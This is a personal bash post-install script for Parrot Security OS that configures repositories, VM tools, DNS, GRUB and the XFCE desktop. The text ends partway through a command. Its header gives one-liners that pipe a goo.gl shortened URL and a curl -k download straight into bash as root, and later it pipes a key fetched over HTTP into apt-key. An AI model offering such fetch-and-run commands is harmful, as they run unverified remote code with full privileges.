#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: parrot4.sh                  (Update: 2019-13-12) #
#-Info--------------------------------------------------------#
#  Personal post-install script for Parrot Security OS        #
#-Author(s)---------------------------------------------------#
#  g0tmilk ~ https://blog.g0tmi1k.com/                        #
#-Modder------------------------------------------------------#
#  Zumkato ~ I_am@Zumkato.ninja                               #
#-Operating System--------------------------------------------#
#  Modded for: Parrot Security OS 4.*                         #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #



#-Notes-------------------------------------------------------#
#  Run as root, after a fresh/clean install of Parrot 3.x.    #
#                             ---                             #
#  You will need 30GB+ of HDD space.                          #
#                             ---                             #
#  Command line arguments:                                    #
#    -burp     = Automates configuring Burp Suite             #
#    -dns      = Use Google's DNS and locks permissions       #
#    -hold     = Disable updating certain packages (e.g. msf) #
#    -openvas  = Installs & configures OpenVAS vuln scanner   #
#    -osx      = Configures Apple keyboard layout             #
#    -full     = Install full tools and features              #
#                                                             #
#    -keyboard <value> = Change the keyboard layout language  #
#    -timezone <value> = Change the timezone location         #
#                                                             #
#    e.g. # bash parrot.sh -osx -burp -openvas -keyboard gb   #
#                             ---                             #
#             ** This script is meant for _ME_. **            #
#         ** EDIT this to meet _YOUR_ requirements! **        #
#-------------------------------------------------------------#


if [ 1 -eq 0 ]; then    # This is never true, thus it acts as block comments ;)
### One liner - Grab the latest version and execute! ###########################
wget -qO parrot.sh https://raw.githubusercontent.com/Zumkato/Testing-Cheats-/master/master/PostInstall/parrot4.sh && bash parrot.sh -dns -full -openvas
################################################################################
## Shorten URL: >->->   wget -qO- https://goo.gl/MdG1fG | bash   <-<-<
##  Alt Method: curl -s -L -k https://raw.githubusercontent.com/Zumkato/Testing-Cheats-/master/master/PostInstall/parrot4.sh > parrot.sh | nohup bash
################################################################################
fi


#-Defaults-------------------------------------------------------------#


##### Location information
keyboardApple=false         # Using a Apple/Macintosh keyboard (non VM)?                [ --osx ]
keyboardLayout=""           # Set keyboard layout                                       [ --keyboard gb]
timezone=""                 # Set timezone location                                     [ --timezone Europe/London ]

##### Optional steps
burpFree=false              # Disable configuring Burp Suite (for Burp Pro users...)    [ --burp ]
hardenDNS=false             # Set static & lock DNS name server                         [ --dns ]
freezeDEB=false             # Disable updating certain packages (e.g. Metasploit)       [ --hold ]
openVAS=false               # Install & configure OpenVAS (not everyone wants it...)    [ --openvas ]
full=false                  # Doesn't insall full toolset                               [--full]


##### (Optional) Enable debug mode?
#set -x

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

STAGE=0                                                       # Where are we up to
TOTAL=$(grep '(${STAGE}/${TOTAL})' $0 | wc -l);(( TOTAL-- ))  # How many things have we got todo

#-Arguments------------------------------------------------------------#


##### Read command line arguments
while [[ "${#}" -gt 0 && ."${1}" == .-* ]]; do
  opt="${1}";
  shift;
  case "$(echo ${opt} | tr '[:upper:]' '[:lower:]')" in
    -|-- ) break 2;;

    -osx|--osx )
      keyboardApple=true;;
    -apple|--apple )
      keyboardApple=true;;

    -dns|--dns )
      hardenDNS=true;;

    -hold|--hold )
      freezeDEB=true;;

    -openvas|--openvas )
      openVAS=true;;

    -burp|--burp )
      burpFree=true;;

    -keyboard|--keyboard )
       keyboardLayout="${1}"; shift;;
    -keyboard=*|--keyboard=* )
       keyboardLayout="${opt#*=}";;

    -timezone|--timezone )
       timezone="${1}"; shift;;
    -timezone=*|--timezone=* )
       timezone="${opt#*=}";;

    -full|--full )
      full=true;;

    *) echo -e ' '${RED}'[!]'${RESET}" Unknown option: ${RED}${opt}${RESET}" 1>&2 && exit 1;;
   esac
done


##### Check user inputs
if [[ -n "${timezone}" && ! -f "/usr/share/zoneinfo/${timezone}" ]]; then
  echo -e ' '${RED}'[!]'${RESET}" Looks like the ${RED}timezone '${timezone}'${RESET} is incorrect/not supported (Example: Europe/London). Quitting..." 1>&2
  exit 1
elif [[ -n "${keyboardLayout}" && -e /usr/share/X11/xkb/rules/xorg.lst ]]; then
  if ! $(grep -q " ${keyboardLayout} " /usr/share/X11/xkb/rules/xorg.lst); then
    echo -e ' '${RED}'[!]'${RESET}" Looks like the ${RED}keyboard layout '${keyboardLayout}'${RESET} is incorrect/not supported (Example: gb). Quitting..." 1>&2
    exit 1
  fi
fi


#-Start----------------------------------------------------------------#


##### Check if we are running as root - else this script will fail (hard!)
if [[ ${EUID} -ne 0 ]]; then
  echo -e ' '${RED}'[!]'${RESET}" This script must be ${RED}run as root${RESET}. Quitting..." 1>&2
  exit 1
else
  echo -e " ${BLUE}[*]${RESET} ${BOLD}Parrot Security OS 2.x post-install script${RESET}"
fi


##### Fix display output for GUI programs when connecting via SSH
export DISPLAY=:0.0   #[[ -z $SSH_CONNECTION ]] || export DISPLAY=:0.0
export TERM=xterm


#####  Give VM users a little heads up to get ready
(dmidecode | grep -iq virtual) && echo -e " ${YELLOW}[i]${RESET} VM Detected. Please be sure to have the ${YELLOW}correct tools ISO mounted${RESET}" && sleep 5s


if [[ $(which gnome-shell) ]]; then
  ##### Disable notification package updater
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Disabling ${GREEN}notification package updater${RESET} service ~ in case it runs during this script"
  export DISPLAY=:0.0   #[[ -z $SSH_CONNECTION ]] || export DISPLAY=:0.0
  dconf write /org/gnome/settings-daemon/plugins/updates/active false
  dconf write /org/gnome/desktop/notifications/application/gpk-update-viewer/active false
  timeout 5 killall -w /usr/lib/apt/methods/http >/dev/null 2>&1

  ##### Disable screensaver
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Disabling ${GREEN}screensaver${RESET}"
  xset s 0 0
  xset s off
  gsettings set org.gnome.desktop.session idle-delay 0   # Disable swipe on lockscreen
fi


##### Check Internet access
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Checking ${GREEN}Internet access${RESET}"
for i in {1..10}; do ping -c 1 -W ${i} www.google.com &>/dev/null && break; done
if [[ "$?" -ne 0 ]]; then
  echo -e ' '${RED}'[!]'${RESET}" ${RED}Possible DNS issues${RESET}(?). Trying DHCP 'fix'" 1>&2
  chattr -i /etc/resolv.conf 2>/dev/null
  dhclient -r
  route delete default gw 192.168.155.1 2>/dev/null
  dhclient
  sleep 15s
  _TMP=true
  _CMD="$(ping -c 1 8.8.8.8 &>/dev/null)"
  if [[ "$?" -ne 0 && "$_TMP" == true ]]; then
    _TMP=false
    echo -e ' '${RED}'[!]'${RESET}" ${RED}No Internet access${RESET}. Manually fix the issue & re-run the script" 1>&2
  fi
  _CMD="$(ping -c 1 www.google.com &>/dev/null)"
  if [[ "$?" -ne 0 && "$_TMP" == true ]]; then
    _TMP=false
    echo -e ' '${RED}'[!]'${RESET}" ${RED}Possible DNS issues${RESET}(?). Manually fix the issue & re-run the script" 1>&2
  fi
  if [[ "$_TMP" == false ]]; then
    (dmidecode | grep -iq virtual) && echo -e " ${YELLOW}[i]${RESET} VM Detected. ${YELLOW}Try switching network adapter mode${RESET} (NAT/Bridged)"
    echo -e ' '${RED}'[!]'${RESET}" Quitting..." 1>&2
    exit 1
  fi
else
  echo -e " ${YELLOW}[i]${RESET} ${YELLOW}Detected Internet access${RESET}" 1>&2
fi
#--- GitHub under DDoS?
(( STAGE++ )); echo -e " ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Checking ${GREEN}GitHub status${RESET}"
timeout 300 curl  -k -L -f "https://status.github.com/api/status.json" | grep -q "good" \
  || (echo -e ' '${RED}'[!]'${RESET}" ${RED}GitHub is currently having issues${RESET}. ${BOLD}Lots may fail${RESET}. See: https://status.github.com/" 1>&2 \
    && exit 1)

(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}Parrot gpg and keyring${RESET}"
 wget -qO - http://archive.parrotsec.org/parrot/misc/parrotsec.gpg | apt-key add -
  apt -y -qq update
  apt -y --force-yes install apt-parrot parrot-archive-keyring --no-install-recommends

##### Enable default network repositories
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Enabling default ParrotSec OS ${GREEN}network repositories${RESET} ~ ...if they were not selected during installation"

#---Remove CDROM from repositories
#rm /etc/apt/sources.list
#sleep 2s
#touch /etc/apt/sources.list
#sleep 2s
#--- Add network repositories
#file=/etc/apt/sources.list; [ -e "${file}" ] && cp -n $file{,.bkup}
#([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
#--- ParrotSec
#grep -q 'deb .* parrot main contrib non-free' "${file}" 2>/dev/null || echo "deb http://deb.parrotsec.org/parrot  parrot main contrib non-free" >> "${file}"
#grep -q 'deb-src .* parrot main contrib non-free' "${file}" 2>/dev/null || echo "deb-src http://deb.parrotsec.org/parrot  parrot main contrib non-free" >> "${file}"
#--- Stable-security
#grep -q 'deb .* stable-security main contrib non-free' "${file}" 2>/dev/null || echo "deb http://deb.parrotsec.org/parrot  stable-security main contrib non-free" >> "${file}"
#grep -q 'deb-src .* stable-security main contrib non-free' "${file}" 2>/dev/null || echo "deb-src http://deb.parrotsec.org/parrot  stable-security main contrib non-free" >> "${file}"
#--- Security-updates
#grep -q 'deb .* stable-updates main contrib non-free' "${file}" 2>/dev/null || echo "deb http://deb.parrotsec.org/parrot  stable-updates main contrib non-free" >> "${file}"
#grep -q 'deb-src .* stable-updates main contrib non-free' "${file}" 2>/dev/null || echo "deb-src http://deb.parrotsec.org/parrot  stable-updates main contrib non-free" >> "${file}"

#--- Update
apt -qq update
if [[ "$?" -ne 0 ]]; then
  echo -e ' '${RED}'[!]'${RESET}" There was an ${RED}issue accessing network repositories${RESET}" 1>&2
  echo -e " ${YELLOW}[i]${RESET} Are the remote network repositories ${YELLOW}currently being sync'd${RESET}?"
  echo -e " ${YELLOW}[i]${RESET} YOUR local ${YELLOW}network repository information${RESET} (Geo-IP based):"
  exit 1
fi


##### Install kernel headers
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}kernel headers${RESET}"
apt -y -qq install make gcc "linux-headers-$(uname -r)" || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
if [[ $? -ne 0 ]]; then
  echo -e ' '${RED}'[!]'${RESET}" There was an ${RED}issue installing kernel headers${RESET}" 1>&2
  echo -e " ${YELLOW}[i]${RESET} Are you ${YELLOW}USING${RESET} the ${YELLOW}latest kernel${RESET}?"
  echo -e " ${YELLOW}[i]${RESET} ${YELLOW}Reboot your machine${RESET}"
  exit 1
fi


##### (Optional) Check to see if ParrotSec is in a VM. If so, install "Virtual Machine Addons/Tools" for a "better" virtual experiment
if [ -e "/etc/vmware-tools" ]; then
  echo -e "\n "${RED}'[!]'${RESET}" VMware Tools is ${RED}already installed${RESET}. Skipping..." 1>&2
elif (dmidecode | grep -iq vmware); then
  ##### Install virtual machines tools
   (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}virtual machine tools${RESET}"
  #--- VM -> Install VMware Tools.
  mkdir -p /mnt/cdrom/
  umount -f /mnt/cdrom 2>/dev/null
  sleep 2s
  mount -o ro /dev/cdrom /mnt/cdrom 2>/dev/null; _mount="$?"   # This will only check the first CD drive (if there are multiple bays)
  sleep 2s
  file=$(find /mnt/cdrom/ -maxdepth 1 -type f -name 'VMwareTools-*.tar.gz' -print -quit)
  ([[ "${_mount}" == 0 && -z "${file}" ]]) && echo -e ' '${RED}'[!]'${RESET}' Incorrect CD/ISO mounted' 1>&2
  if [[ "${_mount}" == 0 && -n "${file}" ]]; then             # If there is a CD in (and its right!), try to install native Guest Additions
    echo -e ' '${YELLOW}'[i]'${RESET}' Patching & using "native VMware tools"'
    apt -y -qq install make gcc "linux-headers-$(uname -r)" git sudo || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
    git clone -q https://github.com/rasa/vmware-tools-patches.git /tmp/vmware-tools-patches || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
    cp -f "${file}" /tmp/vmware-tools-patches/downloads/
    pushd /tmp/vmware-tools-patches/ >/dev/null
    bash untar-and-patch-and-compile.sh
    popd >/dev/null
    umount -f /mnt/cdrom 2>/dev/null
    /usr/bin/vmware-user
  else                                                       # The fallback is 'open vm tools' ~ http://open-vm-tools.sourceforge.net/about.php
    echo -e " ${YELLOW}[i]${RESET} VMware Tools CD/ISO isn't mounted"
    echo -e " ${YELLOW}[i]${RESET} Skipping 'Native VMware Tools', switching to 'Open VM Tools'"
    apt -y -qq install open-vm-tools open-vm-tools-desktop open-vm-tools-dkms || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
    apt -y -qq install make || echo -e ' '${RED}'[!] Issue with apt'${RESET}    # nags afterwards
  fi
elif [ -e "/etc/init.d/vboxadd" ]; then
  echo -e "\n "${RED}'[!]'${RESET}" VirtualBox Guest Additions is ${RED}already installed${RESET}. Skipping..." 1>&2
elif (dmidecode | grep -iq virtualbox); then
  ##### (Optional) Installing Virtualbox Guest Additions.
  echo -e "\n ${GREEN}[+]${RESET} (Optional) Installing ${GREEN}VirtualBox Guest Additions${RESET}"
  #--- Devices -> Install Guest Additions CD image...
  mkdir -p /mnt/cdrom/
  umount -f /mnt/cdrom 2>/dev/null
  sleep 2s
  mount -o ro /dev/cdrom /mnt/cdrom 2>/dev/null; _mount=$?   # Only checks first CD drive (if multiple)
  sleep 2s
  file=/mnt/cdrom/VBoxLinuxAdditions.run
  if [[ "${_mount}" == 0 && -e "${file}" ]]; then
    apt -y -qq install make gcc "linux-headers-$(uname -r)" || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
    cp -f "${file}" /tmp/
    chmod -f 0755 /tmp/VBoxLinuxAdditions.run
    /tmp/VBoxLinuxAdditions.run --nox11
    umount -f /mnt/cdrom 2>/dev/null
  #elif [[ "${_mount}" == 0 ]]; then
  else
    echo -e ' '${RED}'[!]'${RESET}' Incorrect CD/ISO mounted. Skipping...' 1>&2
    #apt -y -qq install virtualbox-guest-x11
  fi
fi



##### Set static & protecting DNS name servers.   Note: May cause issues with forced values (e.g. captive portals etc)
if [ "${hardenDNS}" != "false" ]; then
 (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Setting static & protecting ${GREEN}DNS name servers${RESET}"
  file=/etc/resolv.conf; [ -e "${file}" ] && cp -n $file{,.bkup}
  chattr -i "${file}" 2>/dev/null
  #--- Remove duplicate results
  #uniq "${file}" > "$file.new"; mv $file{.new,}
  #--- Use OpenDNS DNS
  #echo -e 'nameserver 208.67.222.222\nnameserver 208.67.220.220' > "${file}"
  #--- Use Google DNS
  echo -e 'nameserver 8.8.8.8\nnameserver 8.8.4.4' > "${file}"
  #--- Add domain
  #echo -e "domain ${domainName}\n#search ${domainName}" >> "${file}"
  #--- Protect it
  chattr +i "${file}" 2>/dev/null
else
  echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Skipping DNS${RESET} (missing: '$0 ${BOLD}--dns${RESET}')..." 1>&2
fi


##### Update location information - set either value to "" to skip.
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Updating ${GREEN}location information${RESET}"
[ "${keyboardApple}" != "false" ]  && echo -e "\n ${GREEN}[+]${RESET} Applying ${GREEN}Apple hardware${RESET} profile"
#keyboardLayout="gb"          # Great Britain
#timezone="Europe/London"     # London, Europe
#[ -z "${timezone}" ] && timezone=Etc/UTC    #Etc/GMT vs Etc/UTC vs UTC vs Europe/London
#--- Configure keyboard layout
if [[ -n "${keyboardLayout}" ]]; then
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Updating ${GREEN}location information${RESET} ~ keyboard layout (${BOLD}${keyboardLayout}${RESET})"
  geoip_keyboard=$(curl -s http://ifconfig.io/country_code | tr '[:upper:]' '[:lower:]')
  [ "${geoip_keyboard}" != "${keyboardLayout}" ] && echo -e " ${YELLOW}[i]${RESET} Keyboard layout (${BOLD}${keyboardLayout}${RESET}}) doesn't match what's been detected via GeoIP (${BOLD}${geoip_keyboard}${RESET}})"
  file=/etc/default/keyboard; #[ -e "${file}" ] && cp -n $file{,.bkup}
  sed -i 's/XKBLAYOUT=".*"/XKBLAYOUT="'${keyboardLayout}'"/' "${file}"
  [ "${keyboardApple}" != "false" ] && sed -i 's/XKBVARIANT=".*"/XKBVARIANT="mac"/' "${file}"   # Enable if you are using Apple based products.
  #dpkg-reconfigure -f noninteractive keyboard-configuration   #dpkg-reconfigure console-setup   #dpkg-reconfigure keyboard-configuration -u    # Need to restart xserver for effect
else
  echo -e " ${YELLOW}[i]${RESET} ${YELLOW}Skipping keyboard layout${RESET} (missing: '$0 ${BOLD}--keyboard <value>${RESET}')..." 1>&2
fi
#--- Changing time zone
if [[ -n "${timezone}" ]]; then
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Updating ${GREEN}location information${RESET} ~ time zone (${BOLD}${timezone}${RESET})"
  echo "${timezone}" > /etc/timezone
  ln -sf "/usr/share/zoneinfo/$(cat /etc/timezone)" /etc/localtime
  dpkg-reconfigure -f noninteractive tzdata
else
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${YELLOW}Skipping time zone${RESET} (missing: '$0 ${BOLD}--timezone <value>${RESET}')..." 1>&2
fi

#--- Installing ntp
apt -y -qq install ntp ntpdate || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Configuring ntp
#file=/etc/default/ntp; [ -e "${file}" ] && cp -n $file{,.bkup}
#grep -q "interface=127.0.0.1" "${file}" || sed -i "s/NTPD_OPTS='/NTPD_OPTS='--interface=127.0.0.1 /" "${file}"
#--- Update time
ntpdate -b -s -u pool.ntp.org
#--- Start service
systemctl restart ntp
#--- Remove from start up
systemctl disable ntp 2>/dev/null
#--- Check
#date
#--- Only used for stats at the end
start_time=$(date +%s)


if [ "${freezeDEB}" != "false" ]; then
  ##### Don't ever update these packages
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${GREEN}Don't update${RESET} these packages:"
  for x in metasploit-framework; do
    echo -e " ${YELLOW}[i]${RESET} + ${x}"
    echo "${x} hold" | dpkg --set-selections   # To update: echo "{$} install" | dpkg --set-selections
  done
fi

if [ "${full}" != "false" ]; then
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Parrot With all Tool and Features${RESET}"
  apt -y --force-yes install parrot-interface parrot-tools parrot-interface-full parrot-tools-full
fi


##### Update OS from network repositories
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${GREEN}Updating OS${RESET} from network repositories ~ this ${BOLD}may take a while${RESET} depending on your Internet connection & ParrotSec version/age"
for FILE in clean autoremove; do apt -y -qq "${FILE}"; done         # Clean up      clean remove autoremove autoclean
export DEBIAN_FRONTEND=noninteractive
apt -qq update && APT_LISTCHANGES_FRONTEND=none apt -o Dpkg::Options::="--force-confnew" -y dist-upgrade --fix-missing || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2

#--- Cleaning up temp stuff
for FILE in clean autoremove; do apt -y -qq "${FILE}"; done         # Clean up - clean remove autoremove autoclean

#--- Check kernel stuff
_TMP=$(dpkg -l | grep linux-image- | grep -vc meta)
if [[ "${_TMP}" -gt 1 ]]; then
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Detected multiple kernels installed"
  TMP=$(dpkg -l | grep linux-image | grep -v meta | sort -t '.' -k 2 -g | tail -n 1 | grep "$(uname -r)")
  [[ -z "${_TMP}" ]] && echo -e ' '${RED}'[!]'${RESET}' You are '${RED}'not using the latest kernel'${RESET} 1>&2 && echo -e " ${YELLOW}[i]${RESET} You have it downloaded & installed, ${YELLOW}just not using it${RESET}. You ${YELLOW}need to reboot${RESET}" && exit 1
  echo -e " ${YELLOW}[i]${RESET}   Clean up: apt remove --purge $(dpkg -l 'linux-image-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d')"   # DO NOT RUN IF NOT USING THE LASTEST KERNEL!
fi


##### Fix audio issues
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Fixing ${GREEN}audio${RESET} issues"
#--- Unmute on startup
apt -y -qq install alsa-utils || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Set volume now
amixer set Master unmute >/dev/null
amixer set Master 50% >/dev/null

##### Set audio level
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Setting ${GREEN}audio${RESET} levels"
pactl set-sink-mute 0 0
pactl set-sink-volume 0 25%

##### Configure GRUB
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Configuring ${GREEN}GRUB${RESET} ~ boot manager"
grubTimeout=5
(dmidecode | grep -iq virtual) && grubTimeout=1   # Much less if we are in a VM
file=/etc/default/grub; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT='${grubTimeout}'/' "${file}"                 # Time out (lower if in a virtual machine, else possible dual booting)
sed -i 's/^GRUB_CMDLINE_LINUX_DEFAULT=.*/GRUB_CMDLINE_LINUX_DEFAULT=""/' "${file}"   # TTY resolution    #GRUB_CMDLINE_LINUX_DEFAULT="vga=0x0318 quiet"   (crashes VM/vmwgfx)   (See Cosmetics)
update-grub


##### Install XFCE4
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}XFCE4${RESET}${RESET} ~ desktop environment"
export DISPLAY=:0.0
apt -y -qq install curl \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
apt -y -qq install xfce4 xfce4-mount-plugin xfce4-notifyd xfce4-places-plugin \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
(dmidecode | grep -iq virtual) \
  || (apt -y -qq install xfce4-battery-plugin \
    || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2)
#--- Configuring XFCE
mkdir -p ~/.config/xfce4/panel/launcher-{2,4,5,6,7,8,9}/
mkdir -p ~/.config/xfce4/xfconf/xfce-perchannel-xml/
cat <<EOF > ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml \
  || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
<?xml version="1.0" encoding="UTF-8"?>
<channel name="xfce4-keyboard-shortcuts" version="1.0">
  <property name="commands" type="empty">
    <property name="custom" type="empty">
      <property name="XF86Display" type="string" value="xfce4-display-settings --minimal"/>
      <property name="&lt;Alt&gt;F2" type="string" value="xfrun4"/>
      <property name="&lt;Primary&gt;space" type="string" value="xfce4-appfinder"/>
      <property name="&lt;Primary&gt;&lt;Alt&gt;t" type="string" value="/usr/bin/exo-open --launch TerminalEmulator"/>
      <property name="&lt;Primary&gt;&lt;Alt&gt;Delete" type="string" value="xflock4"/>
      <property name="&lt;Primary&gt;Escape" type="string" value="xfdesktop --menu"/>
      <property name="&lt;Super&gt;p" type="string" value="xfce4-display-settings --minimal"/>
      <property name="override" type="bool" value="true"/>
    </property>
  </property>
  <property name="xfwm4" type="empty">
    <property name="custom" type="empty">
      <property name="&lt;Alt&gt;&lt;Control&gt;End" type="string" value="move_window_next_workspace_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;Home" type="string" value="move_window_prev_workspace_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_1" type="string" value="move_window_workspace_1_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_2" type="string" value="move_window_workspace_2_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_3" type="string" value="move_window_workspace_3_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_4" type="string" value="move_window_workspace_4_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_5" type="string" value="move_window_workspace_5_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_6" type="string" value="move_window_workspace_6_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_7" type="string" value="move_window_workspace_7_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_8" type="string" value="move_window_workspace_8_key"/>
      <property name="&lt;Alt&gt;&lt;Control&gt;KP_9" type="string" value="move_window_workspace_9_key"/>
      <property name="&lt;Alt&gt;&lt;Shift&gt;Tab" type="string" value="cycle_reverse_windows_key"/>
      <property name="&lt;Alt&gt;Delete" type="string" value="del_workspace_key"/>
      <property name="&lt;Alt&gt;F10" type="string" value="maximize_window_key"/>
      <property name="&lt;Alt&gt;F11" type="string" value="fullscreen_key"/>
      <property name="&lt;Alt&gt;F12" type="string" value="above_key"/>
      <property name="&lt;Alt&gt;F4" type="string" value="close_window_key"/>
      <property name="&lt;Alt&gt;F6" type="string" value="stick_window_key"/>
      <property name="&lt;Alt&gt;F7" type="string" value="move_window_key"/>
      <property name="&lt;Alt&gt;F8" type="string" value="resize_window_key"/>
      <property name="&lt;Alt&gt;F9" type="string" value="hide_window_key"/>
      <property name="&lt;Alt&gt;Insert" type="string" value="add_workspace_key"/>
      <property name="&lt;Alt&gt;space" type="string" value="popup_menu_key"/>
      <property name="&lt;Alt&gt;Tab" type="string" value="cycle_windows_key"/>
      <property name="&lt;Control&gt;&lt;Alt&gt;d" type="string" value="show_desktop_key"/>
      <property name="&lt;Control&gt;&lt;Alt&gt;Down" type="string" value="down_workspace_key"/>
      <property name="&lt;Control&gt;&lt;Alt&gt;Left" type="string" value="left_workspace_key"/>
      <property name="&lt;Control&gt;&lt;Alt&gt;Right" type="string" value="right_workspace_key"/>
      <property name="&lt;Control&gt;&lt;Alt&gt;Up" type="string" value="up_workspace_key"/>
      <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Left" type="string" value="move_window_left_key"/>
      <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Right" type="string" value="move_window_right_key"/>
      <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Up" type="string" value="move_window_up_key"/>
      <property name="&lt;Control&gt;F1" type="string" value="workspace_1_key"/>
      <property name="&lt;Control&gt;F10" type="string" value="workspace_10_key"/>
      <property name="&lt;Control&gt;F11" type="string" value="workspace_11_key"/>
      <property name="&lt;Control&gt;F12" type="string" value="workspace_12_key"/>
      <property name="&lt;Control&gt;F2" type="string" value="workspace_2_key"/>
      <property name="&lt;Control&gt;F3" type="string" value="workspace_3_key"/>
      <property name="&lt;Control&gt;F4" type="string" value="workspace_4_key"/>
      <property name="&lt;Control&gt;F5" type="string" value="workspace_5_key"/>
      <property name="&lt;Control&gt;F6" type="string" value="workspace_6_key"/>
      <property name="&lt;Control&gt;F7" type="string" value="workspace_7_key"/>
      <property name="&lt;Control&gt;F8" type="string" value="workspace_8_key"/>
      <property name="&lt;Control&gt;F9" type="string" value="workspace_9_key"/>
      <property name="&lt;Shift&gt;&lt;Alt&gt;Page_Down" type="string" value="lower_window_key"/>
      <property name="&lt;Shift&gt;&lt;Alt&gt;Page_Up" type="string" value="raise_window_key"/>
      <property name="&lt;Super&gt;Tab" type="string" value="switch_window_key"/>
      <property name="Down" type="string" value="down_key"/>
      <property name="Escape" type="string" value="cancel_key"/>
      <property name="Left" type="string" value="left_key"/>
      <property name="Right" type="string" value="right_key"/>
      <property name="Up" type="string" value="up_key"/>
      <property name="override" type="bool" value="true"/>
      <property name="&lt;Super&gt;Left" type="string" value="tile_left_key"/>
      <property name="&lt;Super&gt;Right" type="string" value="tile_right_key"/>
      <property name="&lt;Super&gt;Up" type="string" value="maximize_window_key"/>
    </property>
  </property>
  <property name="providers" type="array">
    <value type="string" value="xfwm4"/>
    <value type="string" value="commands"/>
  </property>
</channel>
EOF
#--- Desktop files
ln -sf /usr/share/applications/exo-terminal-emulator.desktop ~/.config/xfce4/panel/launcher-2/exo-terminal-emulator.desktop
ln -sf /usr/share/applications/wireshark.desktop        ~/.config/xfce4/panel/launcher-4/wireshark.desktop
ln -sf /usr/share/applications/firefox.desktop           ~/.config/xfce4/panel/launcher-5/firefox.desktop
ln -sf /usr/share/applications/burpsuite.desktop        ~/.config/xfce4/panel/launcher-6/burpsuite.desktop
ln -sf /usr/share/applications/msfconsole.desktop       ~/.config/xfce4/panel/launcher-7/msfconsole.desktop
ln -sf /usr/share/applications/org.gnome.gedit.desktop       ~/.config/xfce4/panel/launcher-8/textedit.desktop
ln -sf /usr/share/applications/xfce4-appfinder.desktop       ~/.config/xfce4/panel/launcher-9/xfce4-appfinder.desktop
#--- XFCE settings
_TMP=""
[ "${burpFree}" != "false" ] \
  && _TMP="-t int -s 6"
xfconf-query -n -a -c xfce4-panel -p /panels -t int -s 0
xfconf-query --create --channel xfce4-panel --property /panels/panel-0/plugin-ids \
  -t int -s 1   -t int -s 2   -t int -s 3   -t int -s 4   -t int -s 5  ${_TMP}        -t int -s 7   -t int -s 8  -t int -s 9 \
